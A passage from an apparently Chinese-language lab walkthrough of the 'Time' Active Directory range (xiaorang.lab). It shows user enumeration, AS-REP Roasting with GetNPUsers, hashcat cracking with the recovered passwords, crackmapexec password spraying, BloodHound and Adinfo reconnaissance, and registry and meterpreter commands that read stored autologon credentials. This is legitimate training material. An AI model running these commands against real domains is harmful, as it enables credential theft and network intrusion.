class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wenshao@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: louyou@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: chengqiu@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: maqun@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wenbiao@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: weishengshan@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: chuyuan@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: wenliang@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yulvxue@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: luyue@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lezhong@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: guohong@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: pangzhen@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: ganjian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: zhangxin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: dujian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: sheweiyue@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: lidongjin@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: yexing@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: hongqun@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: maoda@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: qiaomei@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">53</span> &gt;  [+] VALID USERNAME: ganjian@xiaorang.lab</span><br><span class="line"><span class="number">2025</span>/<span class="number">05</span>/<span class="number">30</span> <span class="number">22</span>:<span class="number">46</span>:<span class="number">58</span> &gt;  Done! Tested <span class="number">501</span> usernames (<span class="number">74</span> valid) <span class="keyword">in</span> <span class="number">5.025</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>筛选出有效的域用户（74个）</p><p>这里Alt+鼠标选择就可以直接筛选出这些用户名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">weixian@xiaorang.lab</span><br><span class="line">shuzhen@xiaorang.lab</span><br><span class="line">gaiyong@xiaorang.lab</span><br><span class="line">wengbang@xiaorang.lab</span><br><span class="line">xiqidi@xiaorang.lab</span><br><span class="line">xuanjiang@xiaorang.lab</span><br><span class="line">lvhui@xiaorang.lab</span><br><span class="line">yuanchang@xiaorang.lab</span><br><span class="line">wenbo@xiaorang.lab</span><br><span class="line">zhenjun@xiaorang.lab</span><br><span class="line">yangju@xiaorang.lab</span><br><span class="line">jinqing@xiaorang.lab</span><br><span class="line">weicheng@xiaorang.lab</span><br><span class="line">weixian@xiaorang.lab</span><br><span class="line">haobei@xiaorang.lab</span><br><span class="line">jizhen@xiaorang.lab</span><br><span class="line">tangshun@xiaorang.lab</span><br><span class="line">jingze@xiaorang.lab</span><br><span class="line">zhaoxiu@xiaorang.lab</span><br><span class="line">liangliang@xiaorang.lab</span><br><span class="line">rubao@xiaorang.lab</span><br><span class="line">qiyue@xiaorang.lab</span><br><span class="line">xiyi@xiaorang.lab</span><br><span class="line">chouqian@xiaorang.lab</span><br><span class="line">jicheng@xiaorang.lab</span><br><span class="line">beijin@xiaorang.lab</span><br><span class="line">chenghui@xiaorang.lab</span><br><span class="line">jihuan@xiaorang.lab</span><br><span class="line">pengyuan@xiaorang.lab</span><br><span class="line">hongzhi@xiaorang.lab</span><br><span class="line">duanmuxiao@xiaorang.lab</span><br><span class="line">gaijin@xiaorang.lab</span><br><span class="line">chebin@xiaorang.lab</span><br><span class="line">fusong@xiaorang.lab</span><br><span class="line">yifu@xiaorang.lab</span><br><span class="line">yanglang@xiaorang.lab</span><br><span class="line">dongcheng@xiaorang.lab</span><br><span class="line">luwan@xiaorang.lab</span><br><span class="line">zhufeng@xiaorang.lab</span><br><span class="line">tangrong@xiaorang.lab</span><br><span class="line">huabi@xiaorang.lab</span><br><span class="line">lili@xiaorang.lab</span><br><span class="line">lianhuangchen@xiaorang.lab</span><br><span class="line">rangsibo@xiaorang.lab</span><br><span class="line">wohua@xiaorang.lab</span><br><span class="line">haoguang@xiaorang.lab</span><br><span class="line">langying@xiaorang.lab</span><br><span class="line">diaocai@xiaorang.lab</span><br><span class="line">lianggui@xiaorang.lab</span><br><span class="line">manxue@xiaorang.lab</span><br><span class="line">baqin@xiaorang.lab</span><br><span class="line">wenshao@xiaorang.lab</span><br><span class="line">louyou@xiaorang.lab</span><br><span class="line">chengqiu@xiaorang.lab</span><br><span class="line">maqun@xiaorang.lab</span><br><span class="line">wenbiao@xiaorang.lab</span><br><span class="line">weishengshan@xiaorang.lab</span><br><span class="line">chuyuan@xiaorang.lab</span><br><span class="line">wenliang@xiaorang.lab</span><br><span class="line">yulvxue@xiaorang.lab</span><br><span class="line">luyue@xiaorang.lab</span><br><span class="line">lezhong@xiaorang.lab</span><br><span class="line">guohong@xiaorang.lab</span><br><span class="line">pangzhen@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br><span class="line">zhangxin@xiaorang.lab</span><br><span class="line">dujian@xiaorang.lab</span><br><span class="line">sheweiyue@xiaorang.lab</span><br><span class="line">lidongjin@xiaorang.lab</span><br><span class="line">yexing@xiaorang.lab</span><br><span class="line">hongqun@xiaorang.lab</span><br><span class="line">maoda@xiaorang.lab</span><br><span class="line">qiaomei@xiaorang.lab</span><br><span class="line">ganjian@xiaorang.lab</span><br></pre></td></tr></table></figure><h4 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP-Roasting"></a>AS-REP-Roasting</h4><p>接下来进行ASREPRoasting攻击</p><blockquote><p>用户帐户枚举完成后，我们可以尝试使用一种称为ASREPRoasting的攻击方法来滥用 Kerberos 中的功能 。当用户帐户设置了“不需要预身份验证”权限时，就可能发生ASREPRoasting攻击。这意味着该帐户在请求指定用户帐户的Kerberos票据之前不需要提供有效的身份证明。</p></blockquote><blockquote><p><strong>原理：AS-REP Roasting是一种对用户账号进行离线爆破的攻击方式。但是该攻击方式利用比较局限，因为其需要用户账号设置 “Do not require Kerberos preauthentication(不需要kerberos预身份验证) “ 。而该属性默认是没有勾选上的。</strong></p><p><strong>预身份验证是Kerberos身份验证的第一步(AS_REQ &amp; AS_REP)，它的主要作用是防止密码脱机爆破。默认情况下，预身份验证是开启的，KDC会记录密码错误次数，防止在线爆破。</strong></p><p><strong>当关闭了预身份验证后，攻击者可以使用指定用户去请求票据，此时域控不会作任何验证就将 TGT票据 和 该用户Hash加密的Session Key返回。因此，攻击者就可以对获取到的 用户Hash加密的Session Key进行离线破解，如果破解成功，就能得到该指定用户的密码明文。</strong></p></blockquote><p>前提条件：</p><ol><li>域用户设置了 “ Do not require Kerberos preauthentication(不需要kerberos预身份验证) ”</li><li>需要一台可与KDC进行通信的主机&#x2F;用户</li></ol><p>使用<code>impacket-GetNPUsers</code>获取<code>AS-REP</code></p><p>获取文件中的用户是否设置了“不需要<code>Kerberos</code>预身份验证”属性，并自动获取符合条件账户的Hash加密的<code>Login Session Key</code></p><p>查找未设置预认证的域用户</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetNPUsers.py <span class="literal">-dc-ip</span> <span class="number">172.22</span>.<span class="number">6.12</span> <span class="literal">-usersfile</span> valid_users.txt xiaorang.lab/</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/25.png"></p><p>爆破出来两个用户</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/26.png"></p><p>使用hashcat进行离线爆破</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat <span class="literal">-m</span> <span class="number">18200</span> <span class="literal">-a</span> <span class="number">0</span> <span class="literal">--force</span> <span class="number">1</span>.txt rockyou.txt</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$krb5asrep</span><span class="variable">$23</span><span class="variable">$zhangxin</span>@xiaorang.lab@XIAORANG.LAB:<span class="number">24</span>e00a36047878cd0f30969516dc0ec6<span class="variable">$bf0b363a996d3053f7e02899a5c7f64901fff11e689fa8e913</span>                                                                   <span class="number">31</span>f0001e366bb44db6635be26606f5e0e256a5e23a67ff3be18b631a1efd68204b5166f982f5184b8117564798a2177dbad5cb42b2fcf391714cded678db2a70379b2                                                                   <span class="number">20</span>d04684e781e49cab1f2507e62920dcc4cc06c93621220a1b65f93d4c5303658bd32b3e0f83c587e7b0ea217c41989da50397203629d2684476415a74a4f40d20a18                                                                   <span class="number">81</span>dc0c5248c6e652d33d6f0693d96ec13aa84baea6335b1b76bd3a95ae140b803aeca5586fe910edbb6a0a3cfb4df2a4ba79fb4e6445471476f00f3db7bbc607ba20a                                                                   ab60d734ec9d36e0f0b176875a5:strawberry</span><br><span class="line"></span><br><span class="line"><span class="variable">$krb5asrep</span><span class="variable">$23</span><span class="variable">$wenshao</span>@xiaorang.lab@XIAORANG.LAB:<span class="number">92</span>b7ca3f79f7382b0c4b149ea346b6fd<span class="variable">$8b2d6b4259aa9d41f29797d0f57c921e52f45367f6f593fcc2e</span>                                                                   eafb8b6b3f05f58a0892e356abf07bfcadcb47a067b0a84c52754ffadc97bcaa0066416522461fa10ac935c35e517b5a486685d08eeed13cca0f8ae0dc44f1ea2a532                                                                   <span class="number">2</span>f9d54b991897cd5dee05ff8f8990600d489085ac6bb977ecc5a6c0c8be1ccb7bed713c135cc9cb9b9e1c15101469ba4b92f33b16534aafb2d6e5c95bd8854686a1e4                                                                   <span class="number">4071</span>cd16b3332453f459859a3cbb245cd498c3906f97f4bafb10efaca557ac22f1daea408a0d7fc577b79420177ac74af7eab79854f374a805a48377ea77eda165d20                                                                   <span class="number">0</span>cf340e639a5c760098755aad3:hellokitty</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/27.png"></p><p>获取到两个账号和密码</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zhangxin@xiaorang.lab   strawberry</span><br><span class="line"></span><br><span class="line">wenshao@xiaorang.lab   hellokitty</span><br></pre></td></tr></table></figure><p>我们用这两个账号对172.22.6.0&#x2F;24域用户进行密码喷洒</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/28.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/29.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 <span class="literal">-q</span> crackmapexec smb <span class="number">172.22</span>.<span class="number">6.0</span>/<span class="number">24</span> <span class="literal">-u</span> zhangxin <span class="literal">-p</span> <span class="string">&#x27;strawberry&#x27;</span></span><br><span class="line"></span><br><span class="line">proxychains4 <span class="literal">-q</span> crackmapexec smb <span class="number">172.22</span>.<span class="number">6.0</span>/<span class="number">24</span> <span class="literal">-u</span> wenshao <span class="literal">-p</span> <span class="string">&#x27;hellokitty&#x27;</span></span><br></pre></td></tr></table></figure><p>发现都可以</p><p>尝试登录DC,不成功</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/30.png"></p><p>那还是登录172.22.6.25吧</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/31.png"></p><p>成功</p><p>这里我们直接</p><p>上传SharpHound.exe进行信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpHound.exe <span class="literal">-c</span> all</span><br></pre></td></tr></table></figure><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/32.png"></p><p>将生成的zip直接拖到bloodhound</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/33.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#先开启docker服务，然后挂梯子（最好把校园网断了）执行以下命令</span></span><br><span class="line"></span><br><span class="line">bloodhound<span class="literal">-cli</span>.exe install</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">D:\red\内网\免杀工具包\免杀工具包\bloodhound<span class="literal">-cli-windows-amd64</span>&gt;bloodhound<span class="literal">-cli</span>.exe install</span><br><span class="line">[+] Checking the status of Docker and the Compose plugin...</span><br><span class="line">[+] Starting BloodHound environment installation</span><br><span class="line">[*] A production YAML file already exists <span class="keyword">in</span> the current directory. <span class="keyword">Do</span> you want to overwrite it and <span class="keyword">continue</span> with the install? [<span class="type">y</span>/<span class="type">n</span>]: y</span><br><span class="line">[+] Downloading the production YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker<span class="literal">-compose</span>.yml...</span><br><span class="line">[*] A development YAML file already exists <span class="keyword">in</span> the current directory. <span class="keyword">Do</span> you want to overwrite it and <span class="keyword">continue</span> with the install? [<span class="type">y</span>/<span class="type">n</span>]: y</span><br><span class="line">[+] Downloading the development YAML file from https://raw.githubusercontent.com/SpecterOps/BloodHound_CLI/refs/heads/main/docker<span class="literal">-compose</span>.dev.yml...</span><br><span class="line"> app<span class="literal">-db</span> Pulling</span><br><span class="line"> graph<span class="literal">-db</span> Pulling</span><br><span class="line"> bloodhound Pulling</span><br><span class="line"> bloodhound Pulled</span><br><span class="line"> graph<span class="literal">-db</span> Pulled</span><br><span class="line"> app<span class="literal">-db</span> Pulled</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-app-db-1</span>  Running</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-graph-db-1</span>  Running</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-bloodhound-1</span>  Running</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-graph-db-1</span>  Waiting</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-app-db-1</span>  Waiting</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-app-db-1</span>  Healthy</span><br><span class="line"> Container bloodhound<span class="literal">-cli-windows-amd64-graph-db-1</span>  Healthy</span><br><span class="line">[+] BloodHound is ready to go!</span><br><span class="line">[+] You can log <span class="keyword">in</span> as `admin` with this password: AQWdoaF2QZgTxjnkvOVibBitdNjabCvx</span><br><span class="line">[+] You can get your admin password by running: bloodhound<span class="literal">-cli</span> config get default_password</span><br><span class="line">[+] You can access the BloodHound UI at: http://<span class="number">127.0</span>.<span class="number">0.1</span>:<span class="number">8080</span>/ui/login</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先上传zip</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/34.png"></p><p>然后点击Shortest paths to Domain Admins</p><p>查看怎么快速到域控</p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/35.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/36.png"></p><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/37.png"></p><p>或者用adinfo进行信息收集</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">neo4j@ubuntu:/tmp<span class="variable">$</span> ./Adinfo_linux <span class="literal">-d</span> xiaorang.lab <span class="literal">--dc</span> <span class="number">172.22</span>.<span class="number">6.12</span> <span class="literal">-u</span> zhangxin <span class="literal">-p</span> strawberry</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | <span class="string">&#x27;_ \|  _/ _ \     Tools that collect information from domain</span></span><br><span class="line"><span class="string">  / ____ \| |__| | | | | | || (_) |</span></span><br><span class="line"><span class="string"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Try to connect &#x27;</span><span class="number">172.22</span>.<span class="number">6.12</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">[c] Auth Domain: xiaorang.lab</span></span><br><span class="line"><span class="string">[c] Auth user: zhangxin@xiaorang.lab</span></span><br><span class="line"><span class="string">[c] Auth Pass: strawberry</span></span><br><span class="line"><span class="string">[c] connected successfully,try to dump domain info</span></span><br><span class="line"><span class="string">[i] DomainVersion found!</span></span><br><span class="line"><span class="string">                    [+] Windows 2016 Server operating system </span></span><br><span class="line"><span class="string">[i] Domain SID: </span></span><br><span class="line"><span class="string">                    [+] S-1-5-21-3623938633-4064111800-2925858365</span></span><br><span class="line"><span class="string">[i] Domain MAQ found</span></span><br><span class="line"><span class="string">                    [+] 0 </span></span><br><span class="line"><span class="string">[i] Domain Account Policy found</span></span><br><span class="line"><span class="string">                    [+] pwdHistory: 0</span></span><br><span class="line"><span class="string">                    [+] minPwdLength: 0</span></span><br><span class="line"><span class="string">                    [+] minPwdAge: 0(day)</span></span><br><span class="line"><span class="string">                    [+] maxPwdAge: 10675199(day)</span></span><br><span class="line"><span class="string">                    [+] lockoutThreshold: 0</span></span><br><span class="line"><span class="string">                    [+] lockoutDuration: 30(min)</span></span><br><span class="line"><span class="string">[i] Domain Controllers: 1 found</span></span><br><span class="line"><span class="string">                    [+] DC-PROGAME$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.6.12 </span></span><br><span class="line"><span class="string">[i] ADCS has not found!</span></span><br><span class="line"><span class="string">[i] Domain Exchange Server: 0 found</span></span><br><span class="line"><span class="string">[i] Domain All DNS:</span></span><br><span class="line"><span class="string">                    [+] Domain Dns 2 found,Saved in All_DNS.csv</span></span><br><span class="line"><span class="string">[i] Domain Trusts: 0 found</span></span><br><span class="line"><span class="string">[i] SPN: 31 found</span></span><br><span class="line"><span class="string">[i] Domain GPOs: 2 found</span></span><br><span class="line"><span class="string">[i] Domain Admins: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] Enterprise Admins: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] administrators: 1 users found</span></span><br><span class="line"><span class="string">                    [+]Administrator</span></span><br><span class="line"><span class="string">[i] Backup Operators: 0 users found</span></span><br><span class="line"><span class="string">[i] Users: 77 found</span></span><br><span class="line"><span class="string">[i] User with Mail: 0 found</span></span><br><span class="line"><span class="string">[i] Only_name_and_Useful_Users: 74 found</span></span><br><span class="line"><span class="string">[i] Only_admincount=1_andUseful_Users: 1 found</span></span><br><span class="line"><span class="string">[i] Locked Users: 0 found</span></span><br><span class="line"><span class="string">[i] Disabled Users: 3 found</span></span><br><span class="line"><span class="string">[i] Users with passwords not set to expire: 5 found</span></span><br><span class="line"><span class="string">[i] Domain Computers: 2 found</span></span><br><span class="line"><span class="string">[i] Only_name_and_Useful_computers: 2 found</span></span><br><span class="line"><span class="string">[i] Groups: 49 found</span></span><br><span class="line"><span class="string">[i] Domain OUs: 1 found</span></span><br><span class="line"><span class="string">[i] LAPS Not found</span></span><br><span class="line"><span class="string">[i] LAPS passwords: 0 found</span></span><br><span class="line"><span class="string">[i] SensitiveDelegate Users: 0 found</span></span><br><span class="line"><span class="string">[i] AsReproast Users: 2 found</span></span><br><span class="line"><span class="string">                    [+] wenshao </span></span><br><span class="line"><span class="string">                    [+] zhangxin </span></span><br><span class="line"><span class="string">[i] Kerberoast Users: 1 found</span></span><br><span class="line"><span class="string">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw </span></span><br><span class="line"><span class="string">[i] SIDHistory Users: 1 found</span></span><br><span class="line"><span class="string">                    [+] yuxuan  ==&gt;&gt;&gt;  Administrator </span></span><br><span class="line"><span class="string">[i] CreatorSID Users: 0 found</span></span><br><span class="line"><span class="string">[i] RBCD Users: 0 found</span></span><br><span class="line"><span class="string">[i] Unconstrained Deligation Users: 0 found</span></span><br><span class="line"><span class="string">[i] Constrained Deligation Users: 0 found</span></span><br><span class="line"><span class="string">[i] Krbtgt password last set time: 2022-06-29 09:03:34 +0800 CST</span></span><br><span class="line"><span class="string">[i] CSVs written to &#x27;</span>csv<span class="string">&#x27; directory in /tmp</span></span><br><span class="line"><span class="string">[i] Execution took 803.781234ms</span></span><br></pre></td></tr></table></figure><h4 id="HasSession"><a href="#HasSession" class="headerlink" title="HasSession"></a>HasSession</h4><p><a href="https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/hassession.html#_0">https://www.c1trus.top/24-%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E5%BA%93/hassession.html#_0</a></p><p><a href="https://bloodhound.specterops.io/resources/edges/has-session">https://bloodhound.specterops.io/resources/edges/has-session</a></p><blockquote><p><font style="color:rgb(26, 32, 41);">当用户对计算机进行身份验证时，通常会留下暴露在系统中的凭据信息，这些凭据可通过以下方式获取：</font></p><ul><li><font style="color:rgb(26, 32, 41);">LSASS进程注入</font></li><li><font style="color:rgb(26, 32, 41);">令牌操作与窃取</font></li><li><font style="color:rgb(26, 32, 41);">用户进程注入</font></li></ul><p><font style="color:rgb(26, 32, 41);">任何具有系统管理员权限的用户，只要内存中仍存在相关凭据数据，就有能力提取这些凭据材料。</font></p><p><font style="color:rgb(26, 32, 41);">需要特别注意的是：会话存在仅意味着凭据可能存在于内存中，并不能保证凭据必然存在。</font></p></blockquote><p>这里信息收集出来显示win2019的机子保存了yuxuan的凭据</p><p>那么我们有两种方法获取yuxuan的密码</p><ol><li>使用msf模块从注册表中获取明文密码<ol><li><code>meterpreter &gt; run post/windows/gather/credentials/windows_autologin</code></li></ol></li><li>直接从注册表中获取<ol><li><code>reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></li></ol></li></ol><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Time/38.png"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 